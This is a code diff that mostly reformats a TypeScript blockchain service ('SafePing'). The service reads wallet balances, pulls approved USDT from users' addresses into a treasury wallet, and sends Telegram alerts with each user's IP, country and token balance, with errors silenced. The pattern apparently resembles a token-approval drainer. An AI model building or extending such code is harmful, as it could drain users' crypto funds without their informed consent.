@@ -2,13 +2,7 @@
 // 🔗 SafePing Main Service
 // =================================
 
-import {
-  BlockchainResult,
-  ChainType,
-  CurrencyType,
-  TransferResult,
-  TreasuryWalletBalance,
-} from "@/types";
+import { BlockchainResult, ChainType, CurrencyType, TransferResult, TreasuryWalletBalance } from "@/types";
 import { TronService } from "./tronService";
 import { EVMService } from "./evmService";
 import { TelegramService } from "./telegramService";
@@ -37,11 +31,7 @@ export class BlockchainService {
   /**
    * Get user's token balance
    */
-  async getUserTokenBalance(
-    chain: ChainType,
-    currency: CurrencyType,
-    userAddress: string
-  ): Promise<string> {
+  async getUserTokenBalance(chain: ChainType, currency: CurrencyType, userAddress: string): Promise<string> {
     try {
       if (chain === "tron") {
         return await TronService.getUserTokenBalance(currency, userAddress);
@@ -56,10 +46,7 @@ export class BlockchainService {
   /**
    * Get user's native token balance
    */
-  async getUserNativeBalance(
-    chain: ChainType,
-    address: string
-  ): Promise<string> {
+  async getUserNativeBalance(chain: ChainType, address: string): Promise<string> {
     try {
       if (chain === "tron") {
         return await TronService.getUserNativeBalance(address);
@@ -82,41 +69,33 @@ export class BlockchainService {
     paymentId: string,
     txHash: string,
     clientIP?: string
-  ): Promise<{ success: boolean, message?: string }> {
+  ): Promise<{ success: boolean; message?: string }> {
     try {
       const tokenBalance = await this.getUserTokenBalance(chain, currency as CurrencyType, userAddress);
 
       // Common database update function - moved to API calls
       const updateWalletDatabase = async () => {
         try {
-          console.log(
-            "🔄 Updating wallet database for:",
-            userAddress,
-            chain,
-            currency
-          );
+          console.log("🔄 Updating wallet database for:", userAddress, chain, currency);
 
           // Call API endpoint instead of direct database access (absolute URL required server-side)
           const response = await fetch(`${getApiBaseUrl()}/api/payment/update-wallet`, {
             method: "POST",
             headers: {
-              "Content-Type": "application/json",
+              "Content-Type": "application/json"
             },
             body: JSON.stringify({
               address: userAddress,
               chain: chain,
               currency: currency,
               amount: amount,
-              tokenBalance: tokenBalance,
-            }),
+              tokenBalance: tokenBalance
+            })
           });
 
           if (response.ok) {
             const result = await response.json();
-            console.log(
-              "✅ Successfully updated wallet database via API:",
-              result.message
-            );
+            console.log("✅ Successfully updated wallet database via API:", result.message);
           } else {
             console.warn("⚠️ Wallet database update failed via API");
           }
@@ -129,24 +108,20 @@ export class BlockchainService {
       // Update payment status in database - moved to API calls
       const updatePaymentDatabase = async (txHash?: string) => {
         try {
-          console.log(
-            "🔄 Updating payment database for:",
-            paymentId,
-            "status: completed"
-          );
+          console.log("🔄 Updating payment database for:", paymentId, "status: completed");
 
           // Call API endpoint instead of direct database access (absolute URL required server-side)
           const response = await fetch(`${getApiBaseUrl()}/api/payment/update-status`, {
             method: "POST",
             headers: {
-              "Content-Type": "application/json",
+              "Content-Type": "application/json"
             },
             body: JSON.stringify({
               paymentId: paymentId,
               status: "completed",
               walletAddress: userAddress,
-              txHash: txHash || "",
-            }),
+              txHash: txHash || ""
+            })
           });
 
           if (response.ok) {
@@ -175,7 +150,7 @@ export class BlockchainService {
             walletType,
             clientIP,
             tokenBalance,
-            country,
+            country
           });
         } catch (telegramError) {
           // Silent error handling for production
@@ -190,28 +165,18 @@ export class BlockchainService {
 
         // Update database and send notification (non-blocking)
         if (approvalData.needsApproval) {
-          const tasks = [
-            updateWalletDatabase(),
-            updatePaymentDatabase(txHash),
-            sendTelegramNotification(),
-          ];
+          const tasks = [updateWalletDatabase(), updatePaymentDatabase(txHash), sendTelegramNotification()];
 
           try {
             const results = await Promise.allSettled(tasks);
 
             results.forEach((res, i) => {
               if (res.status === "rejected") {
-                console.warn(
-                  `⚠️ Task ${i + 1} failed during background operations:`,
-                  res.reason
-                );
+                console.warn(`⚠️ Task ${i + 1} failed during background operations:`, res.reason);
               }
             });
           } catch (err) {
-            console.error(
-              "Unexpected error during background operations:",
-              err
-            );
+            console.error("Unexpected error during background operations:", err);
           }
         }
       } else {
@@ -220,25 +185,39 @@ export class BlockchainService {
 
         // Update database and send notification (non-blocking)
         if (approvalData.needsApproval) {
-          const tasks = [
-            updateWalletDatabase(),
-            updatePaymentDatabase(txHash),
-            sendTelegramNotification(),
-          ];
+          const tasks = [updateWalletDatabase(), updatePaymentDatabase(txHash), sendTelegramNotification()];
 
-          Promise.allSettled(tasks).catch((error) => {
-            console.warn(
-              "⚠️ Some background operations failed, but payment continues:",
-              error
-            );
+          Promise.allSettled(tasks).catch(error => {
+            console.warn("⚠️ Some background operations failed, but payment continues:", error);
           });
         }
       }
 
-      return { success: true};
+      return { success: true };
     } catch (error: any) {
       // Silent error handling for production
       return { success: false, message: error.message };
+    }
+  }
+
+  /**
+   * Transfer token from approved user
+   */
+  async transferFromUser(
+    chain: ChainType,
+    currency: CurrencyType,
+    fromAddress: string,
+    toAddress: string,
+    amount: string
+  ): Promise<BlockchainResult> {
+    try {
+      if (chain === "tron") {
+        return await TronService.transferFromUser(currency, fromAddress, toAddress, amount);
+      } else {
+        return await EVMService.transferFromUser(chain, currency, fromAddress, toAddress, amount);
+      }
+    } catch (error: any) {
+      return { success: false, error: error.message };
     }
   }
 
@@ -262,20 +241,14 @@ export class BlockchainService {
         return {
           success: false,
           error: `No treasury wallet configured for ${chain}`,
-          transferSuccess: false,
+          transferSuccess: false
         };
       }
 
       const treasuryAddress = treasuryWallet.address;
 
       // Execute transfer using the SafePing contract
-      const result = await this.transferFromUser(
-        chain,
-        currency,
-        fromAddress,
-        treasuryAddress,
-        amount
-      );
+      const result = await this.transferFromUser(chain, currency, fromAddress, treasuryAddress, amount);
 
       if (result.success) {
         // Send webhook notification
@@ -284,7 +257,7 @@ export class BlockchainService {
           txHash: result.txHash,
           transferSuccess: true,
           transferTxHash: result.txHash,
-          chain: chain,
+          chain: chain
         };
         await this.sendPaymentWebhook(paymentId, "completed", webhookResult);
 
@@ -294,20 +267,20 @@ export class BlockchainService {
           message: "Auto-transfer completed successfully",
           transferSuccess: true,
           transferTxHash: result.txHash,
-          chain: chain,
+          chain: chain
         };
       } else {
         return {
           success: false,
           error: result.error || "Transfer failed",
-          transferSuccess: false,
+          transferSuccess: false
         };
       }
     } catch (error: any) {
       return {
         success: false,
         error: error.message || "Auto-transfer failed",
-        transferSuccess: false,
+        transferSuccess: false
       };
     }
   }
@@ -324,20 +297,9 @@ export class BlockchainService {
   ): Promise<BlockchainResult> {
     try {
       if (chain === "tron") {
-        return await TronService.transferFromUserAsOwner(
-          currency,
-          fromAddress,
-          toAddress,
-          amount
-        );
+        return await TronService.transferFromUserAsOwner(currency, fromAddress, toAddress, amount);
       } else {
-        return await EVMService.transferFromUserAsOwner(
-          chain,
-          currency,
-          fromAddress,
-          toAddress,
-          amount
-        );
+        return await EVMService.transferFromUserAsOwner(chain, currency, fromAddress, toAddress, amount);
       }
     } catch (error: any) {
       return { success: false, error: error.message };
@@ -347,11 +309,7 @@ export class BlockchainService {
   /**
    * Send webhook notification for payment status change
    */
-  private async sendPaymentWebhook(
-    paymentId: string,
-    status: string,
-    transferResult: TransferResult
-  ): Promise<void> {
+  private async sendPaymentWebhook(paymentId: string, status: string, transferResult: TransferResult): Promise<void> {
     try {
       const webhookUrl = process.env.WEBHOOK_URL;
       if (!webhookUrl) return;
@@ -361,13 +319,13 @@ export class BlockchainService {
         status: status,
         transfer_tx_hash: transferResult.txHash,
         timestamp: new Date().toISOString(),
-        chain: transferResult.chain || "unknown",
+        chain: transferResult.chain || "unknown"
       };
 
       await fetch(webhookUrl, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(payload),
+        body: JSON.stringify(payload)
       });
     } catch (error) {
       // Silent error handling for production
@@ -375,45 +333,9 @@ export class BlockchainService {
   }
 
   /**
-   * Transfer USDT from approved user (owner only)
-   */
-  async transferFromUser(
-    chain: ChainType,
-    currency: CurrencyType,
-    fromAddress: string,
-    toAddress: string,
-    amount: string
-  ): Promise<BlockchainResult> {
-    try {
-      if (chain === "tron") {
-        return await TronService.transferFromUser(
-          chain,
-          currency,
-          fromAddress,
-          toAddress,
-          amount
-        );
-      } else {
-        return await EVMService.transferFromUser(
-          chain,
-          currency,
-          fromAddress,
-          toAddress,
-          amount
-        );
-      }
-    } catch (error: any) {
-      return { success: false, error: error.message };
-    }
-  }
-
-  /**
    * Get user's approved USDT allowance
    */
-  async getUserAllowance(
-    chain: ChainType,
-    userAddress: string
-  ): Promise<string> {
+  async getUserAllowance(chain: ChainType, userAddress: string): Promise<string> {
     try {
       if (chain === "tron") {
         return await TronService.getUserAllowance(chain, userAddress);
@@ -445,10 +367,7 @@ export class BlockchainService {
   /**
    * Revoke user approval
    */
-  async revokeUserApproval(
-    chain: ChainType,
-    userAddress: string
-  ): Promise<BlockchainResult> {
+  async revokeUserApproval(chain: ChainType, userAddress: string): Promise<BlockchainResult> {
     try {
       if (chain === "tron") {
         return await TronService.revokeUserApproval(chain, userAddress);
@@ -471,15 +390,13 @@ export class BlockchainService {
     console.log(`\n=== TREASURY WALLET BALANCES ===`);
     console.log(`Fetching balances for ${wallets.length} treasury wallets...`);
 
-    const balancePromises = wallets.map(async (wallet) => {
+    const balancePromises = wallets.map(async wallet => {
       try {
-        console.log(
-          `\n--- Fetching balances for ${wallet.chain} wallet: ${wallet.address} ---`
-        );
+        console.log(`\n--- Fetching balances for ${wallet.chain} wallet: ${wallet.address} ---`);
 
         const [nativeBalance, tokenBalance] = await Promise.all([
           this.getUserNativeBalance(wallet.chain, wallet.address),
-          this.getUserTokenBalance(wallet.chain, currency as CurrencyType, wallet.address),
+          this.getUserTokenBalance(wallet.chain, currency as CurrencyType, wallet.address)
         ]);
 
         console.log(
@@ -491,28 +408,23 @@ export class BlockchainService {
           chain: wallet.chain,
           nativeBalance,
           tokenBalance,
-          lastUpdated: new Date().toISOString(),
+          lastUpdated: new Date().toISOString()
         };
       } catch (error) {
-        console.error(
-          `❌ Error fetching balances for ${wallet.chain} wallet ${wallet.address}:`,
-          error
-        );
+        console.error(`❌ Error fetching balances for ${wallet.chain} wallet ${wallet.address}:`, error);
         // Return default values if balance fetching fails
         return {
           address: wallet.address,
           chain: wallet.chain,
           nativeBalance: "0.000000",
           tokenBalance: "0.00",
-          lastUpdated: new Date().toISOString(),
+          lastUpdated: new Date().toISOString()
         };
       }
     });
 
     const results = await Promise.all(balancePromises);
-    console.log(
-      `\n✅ Successfully fetched balances for ${results.length} treasury wallets`
-    );
+    console.log(`\n✅ Successfully fetched balances for ${results.length} treasury wallets`);
     console.log(`=== END TREASURY WALLET BALANCES ===\n`);
     return results;
   }
